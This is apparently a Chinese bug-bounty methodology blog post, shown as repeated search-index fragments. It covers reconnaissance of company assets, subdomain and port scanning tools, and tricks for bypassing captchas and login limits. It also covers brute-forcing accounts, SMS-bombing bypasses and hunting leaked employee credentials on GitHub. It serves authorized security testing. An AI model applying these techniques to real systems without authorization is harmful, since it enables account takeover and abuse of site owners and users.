查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#goby"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#bbscan"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#js信息收集"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#捡中低危漏洞的一些技巧"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#登录框处常见的一些漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 